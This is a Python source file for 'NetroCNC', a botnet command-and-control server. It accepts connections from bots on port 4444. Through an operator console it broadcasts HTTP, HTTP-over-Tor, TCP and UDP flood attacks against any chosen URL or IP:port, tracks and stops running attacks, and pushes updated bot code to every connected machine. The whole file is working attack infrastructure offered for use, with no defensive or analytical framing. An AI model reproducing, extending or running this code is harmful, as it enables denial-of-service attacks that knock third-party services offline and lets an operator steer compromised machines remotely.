from urllib.parse import urlparse
import threading
import socket
import random
import string
import time
import json
import sys
import os

class NetroCNC(object):
    attacks_path = f"{os.path.dirname(__file__)}/running_attacks.json"
    client_bots = []
    bot_hostnames = {}
    ping_sequences = {}

    def __init__(self, host: str, port: int, timeout: int = 10):
        self.host = host
        self.port = port

        if not os.path.exists(self.attacks_path):
            with open(self.attacks_path, "a") as file:
                file.write("{}")
                file.close()
    
    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen()

        while True:
            client_sock, client_address = sock.accept()
            threading.Thread(target=self.client_handler, args=[client_sock], daemon=True).start()

    def client_handler(self, client_sock: socket.socket):
        self.client_bots.append(client_sock)

        try:
            while True:
                message = b""

                while True:
                    chunk = client_sock.recv(1)

                    if not chunk:
                        raise Exception("Connection closed.")
                    
                    message += chunk

                    if message.endswith(b"\r\n\r\n"):
                        break
                
                self.on_message(client_sock=client_sock, message=json.loads(message))
        except Exception:
            self.client_bots.remove(client_sock)
            client_sock.close()

            if client_sock in self.ping_sequences:
                del self.ping_sequences[client_sock]
            
            if client_sock in self.bot_hostnames:
                del self.bot_hostnames[client_sock]

    def on_message(self, client_sock: socket.socket, message: dict):
        if not "op" in message:
            raise Exception("Invalid message.")

        match message["op"]:
            case "PING":
                self.on_ping(client_sock=client_sock, ping_data=message)
            case "LOGIN":
                self.on_login(client_sock=client_sock, login_data=message)
    
    def on_login(self, client_sock: socket.socket, login_data: dict):
        if client_sock in self.bot_hostnames:
            raise Exception("Client already logged in.")

        if not "hostname" in login_data:
            raise Exception("Invalid login data.")
        
        self.bot_hostnames[client_sock] = login_data["hostname"]

        running_attacks = self.get_running_attacks()

        self.send_message(client_sock=client_sock, message={"op": "ATTACK_LIST", "running_attacks": running_attacks})

    def on_ping(self, client_sock: socket.socket, ping_data: dict):
        if not "sequence" in ping_data:
            raise Exception("Invalid ping sequence.")
        
        ping_sequence = ping_data["sequence"]

        if not client_sock in self.ping_sequences:
            if not ping_sequence == 0:
                raise Exception("Invalid ping sequence.")
            
            self.ping_sequences[client_sock] = 0
        else:
            last_ping_sequence = self.ping_sequences[client_sock]
            
            if not last_ping_sequence + 1 == ping_sequence:
                raise Exception("Invalid ping sequence.")
            
            self.ping_sequences[client_sock] += 1
            
        self.send_message(client_sock=client_sock, message={"op": "PONG", "sequence": ping_sequence})
    
    def send_message(self, client_sock: socket.socket, message: dict):
        if not client_sock in self.client_bots:
            raise Exception("Client sock has been removed.")

        return client_sock.send(json.dumps(message).encode() + b"\r\n\r\n")
    
    def broadcast_message(self, message: dict):
        total_client_bots = len(self.client_bots)

        for client_bot in self.client_bots:
            threading.Thread(target=self.send_message, args=[client_bot, message], daemon=True).start()

        return total_client_bots

    def execute_command(self, command: str, args: list = []):
        match command:
            case "help":
                return self.command_help()
            case "bots":
                return self.command_bots()
            case "attacks":
                return self.command_attacks()
            case "launch":
                return self.command_launch(args=args)
            case "clear":
                return clear_console()
            case "stop":
                return self.command_stop(args=args)
            case "bot_list":
                return self.command_bot_list()
            case "stop_all":
                return self.command_stop_all()
            case "update":
                return self.command_update()
        
        return "Command not found. Type \"help\" to show the list of available commands."
    
    def command_help(self):
        with open("cnc_help.txt", "r") as help_file:
            help_message = help_file.read()
            help_file.close()
        
        return help_message

    def command_bots(self):
        return f"Bots connected: {len(self.client_bots)}"
    
    def command_bot_list(self):
        if len(self.bot_hostnames) < 1:
            return "No bots connected."

        client_socks = self.bot_hostnames.copy()
        client_hostnames = dict((v, k) for k, v in client_socks.items())

        sep1 = 10

        for hostname in client_hostnames:
            se1 = len(str(hostname))

            if se1 > sep1:
                sep1 = se1 + 2

        output = f"Hostname{' ' * int(sep1 - 8)}Address\n\n"

        for hostname in sorted(client_hostnames):
            client_host, client_port = client_hostnames[hostname].getpeername()
            client_address = f"{client_host}:{client_port}"
            output += f"{hostname}{' ' * int(sep1 - len(hostname))}{client_address}\n"
        
        output += f"\nTotal Bots: {len(client_socks)}"
        
        return output
    
    def command_launch(self, args: list):
        if len(args) < 1:
            return "Missing command arguments. Type \"help\" to show the launch command manual."
        
        attack_methods = ["http", "http-post", "http-tor", "hcf", "udp", "tcp"]
        attack_method = args[0].lower()

        if not attack_method in attack_methods:
            return f"This attack method does not exist. Available attack methods: {attack_methods}"
        
        args.pop(0)
        
        match attack_method:
            case "http":
                return self.attack_method_http(args=args, http_method="http")
            case "http-post":
                return self.attack_method_http(args=args, http_method="http-post")
            case "http-tor":
                return self.attack_method_http(args=args, http_method="http-tor")
            case "hcf":
                return self.attack_method_http(args=args, http_method="hcf")
            case "tcp":
                return self.attack_method_tcp(args=args)
            case "udp":
                return self.attack_method_udp(args=args)

    def attack_method_http(self, args: list, http_method: str = "http"):
        usage = f"launch {http_method} [URL] [DURATION] [CONCURRENCY]"
        
        try:
            url = args[0]

            parsed = urlparse(url)

            if not parsed.hostname.endswith("onion"):
                socket.gethostbyname(parsed.hostname)

            if not parsed.scheme in ["http", "https"]:
                raise Exception
            
        except Exception:
            return f"Error: Missing or invalid HTTP attack URL.\nUsage: {usage}"
        
        try:
            duration = int(args[1])

            if duration < 10:
                raise Exception
        except Exception:
            return f"Error: Missing or invalid HTTP attack duration.\nUsage: {usage}"
        
        try:
            concurrency = int(args[2])

            if concurrency < 1:
                raise Exception
        except Exception:
            return f"Error: Missing or invalid HTTP attack concurrency.\nUsage: {usage}"
        
        attack_id = self.generate_attack_id()
        attack_timeout = time.time() + duration

        attack_command = {
            "op": "COMMAND",
            "command": "launch",
            "attack_payload": {
                "id": attack_id,
                "method": http_method,
                "target": url,
                "timeout": attack_timeout,
                "concurrency": concurrency
            }
        }

        total_bots = self.broadcast_message(message=attack_command)
        self.store_attack(attack_payload=attack_command["attack_payload"])

        return f"Initialized {http_method.upper()} attack on {url}\nAttack ID: {attack_id}\nTotal Bots: {total_bots}\nDuration: {duration}\nConcurrency: {concurrency}"

    def attack_method_tcp(self, args: list):
        usage = "launch tcp [IP:PORT] [DURATION] [CONCURRENCY]"

        try:
            target = args[0]
            host, port = target.split(":", 1)
            port = int(port)

            socket.gethostbyname(host)

            if any([port < 1, port > 65535]):
                raise Exception
        except Exception:
            return f"Error: Missing or invalid TCP attack target.\nUsage: {usage}"
            
        try:
            duration = int(args[1])

            if duration < 10:
                raise Exception
        except Exception:
            return f"Error: Missing or invalid TCP attack duration.\nUsage: {usage}"

        try:
            concurrency = int(args[2])
        except Exception:
            return f"Error: Missing or invalid TCP attack concurrency.\nUsage: {usage}"

        attack_id = self.generate_attack_id()
        attack_timeout = time.time() + duration

        attack_command = {
            "op": "COMMAND",
            "command": "launch",
            "attack_payload": {
                "id": attack_id,
                "method": "tcp",
                "target": target,
                "timeout": attack_timeout,
                "concurrency": concurrency
            }
        }

        total_bots = self.broadcast_message(message=attack_command)
        self.store_attack(attack_payload=attack_command["attack_payload"])

        return f"Initialized TCP attack on {target}\nAttack ID: {attack_id}\nTotal Bots: {total_bots}\nDuration: {duration}\nConcurrency: {concurrency}"

    def attack_method_udp(self, args: list):
        usage = "launch udp [IP:PORT] [DURATION]"

        try:
            target = args[0]
            host, port = target.split(":", 1)
            port = int(port)

            socket.gethostbyname(host)

            if any([port < 1, port > 65535]):
                raise Exception
        except Exception:
            return f"Error: Missing or invalid UDP attack target.\nUsage: {usage}"
        
        try:
            duration = int(args[1])

            if duration < 10:
                raise Exception
        except Exception:
            return f"Error: Missing or invalid UDP attack duration.\nUsage: {usage}"

        attack_id = self.generate_attack_id()
        attack_timeout = time.time() + duration

        attack_command = {
            "op": "COMMAND",
            "command": "launch",
            "attack_payload": {
                "id": attack_id,
                "method": "udp",
                "target": target,
                "timeout": attack_timeout,
                "concurrency": 1
            }
        }

        total_bots = self.broadcast_message(message=attack_command)
        self.store_attack(attack_payload=attack_command["attack_payload"])

        return f"Initialized UDP attack on {target}\nAttack ID: {attack_id}\nTotal Bots: {total_bots}\nDuration: {duration}"

    def generate_attack_id(self):
        return "".join(random.choices(string.ascii_letters + string.digits, k=10))
    
    def command_attacks(self):
        output = ""

        running_attacks = self.get_running_attacks()
        
        if not running_attacks:
            output = "No running attacks."

        else:
            sep1 = 0
            sep2 = 0
            sep3 = 0
            sep4 = 0

            for attack_id in running_attacks:
                attack_payload = running_attacks[attack_id]
                se1 = len(str(attack_id))
                se2 = len(str(attack_payload["method"]))
                se3 = len(str(attack_payload["target"]))
                se4 = len(str(attack_payload["timeout"]))

                if se1 > sep1:
                    sep1 = se1 + 2
                if se2 > sep2:
                    sep2 = se2 + 2
                if se3 > sep3:
                    sep3 = se3 + 2
                if se4 > sep4:
                    sep4 = se4 + 2
            
            output = f"ID{' ' * int(sep1 - 2)}Method{' ' * int(sep2 - 6)}Target{' ' * int(sep3 - 6)}Timeout{' ' * int(sep4 - 7)}Concurrency\n"
            for attack_id in running_attacks:
                attack_payload = running_attacks[attack_id]
                method = str(attack_payload["method"])
                target = str(attack_payload["target"])
                timeout = str(attack_payload["timeout"])
                concurrency = str(attack_payload["concurrency"])

                output += f"{attack_id}{' ' * int(sep1 - len(attack_id))}{method}{' ' * int(sep2 - len(method))}{target}{' ' * int(sep3 - len(target))}{timeout}{' ' * int(sep4 - len(timeout))}{concurrency}\n"

        return output

    def command_stop(self, args: list):
        if len(args) < 1:
            return "Missing attack ID. Type \"help\" to show the stop command example."

        running_attacks = self.get_running_attacks()

        attack_id = args[0]

        if not attack_id in running_attacks:
            return "This attack ID does not exist. Type \"attacks\" to show the list of currently running attacks."

        self.broadcast_message({"op": "COMMAND", "command": "stop_attack", "attack_id": attack_id})

        running_attacks = self.get_running_attacks()
        del running_attacks[attack_id]
        json.dump(running_attacks, open(self.attacks_path, "w"))

        return f"Attack ID: {attack_id} has been stopped."

    def command_stop_all(self):
        running_attacks = self.get_running_attacks()

        json.dump({}, open(self.attacks_path, "w"))
        self.broadcast_message(message={"op": "ATTACK_LIST", "running_attacks": {}})

        return f"Stopped {len(running_attacks)} attacks."

    def command_update(self):
        with open("netro_bot.py", "r") as file:
            script_content = file.read()
            file.close()
        
        self.broadcast_message(message={"op": "UPDATE", "script_content": script_content})

        return "Successfully told bots to update."

    def store_attack(self, attack_payload: dict):
        attack_id = attack_payload["id"]
        del attack_payload["id"]

        running_attacks = self.get_running_attacks()

        running_attacks[attack_id] = attack_payload

        json.dump(running_attacks, open(self.attacks_path, "w"))
    
    def get_running_attacks(self):
        running_attacks = json.load(open(self.attacks_path, "r"))

        for attack_id in running_attacks.copy():
            attack_payload = running_attacks[attack_id]
            if time.time() >= attack_payload["timeout"]:
                del running_attacks[attack_id]
        
        return running_attacks

class Colors:
    RED = "\u001b[31;1m"
    GREEN = "\u001b[32;1m"
    YELLOW = "\u001b[33;1m"
    BLUE = "\u001b[34;1m"
    PURPLE = "\u001b[35;1m"
    CYAN = "\u001b[36;1m"
    RESET = "\u001b[0;0m"

def clear_console():
    if sys.platform == "win32":
        os.system("cls")
    elif sys.platform in ["linux", "linux2"]:
        os.system("clear")

def show_banner():
    with open(f"{os.path.dirname(__file__)}/cnc_banner.txt", "r") as banner_file:
        banner = banner_file.read()
        banner_file.close()

    print(f"{Colors.RED}{banner}{Colors.RESET}\n")

def main():
    clear_console()
    show_banner()

    print("Initializing server...")
    time.sleep(0.3)
    netro_cnc = NetroCNC(host="0.0.0.0", port=4444, timeout=10)
    threading.Thread(target=netro_cnc.start, daemon=True).start()
    print(f"Server has initialized. Type \"help\" to show the list of available commands.\n")

    while True:
        full_command = input(">")

        try:
            command, args = full_command.split(" ", 1)
            args = args.split(" ")
        except Exception:
            command = full_command
            args = []
        
        result = netro_cnc.execute_command(command=command, args=args)

        if result:
            print(f"{result}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()
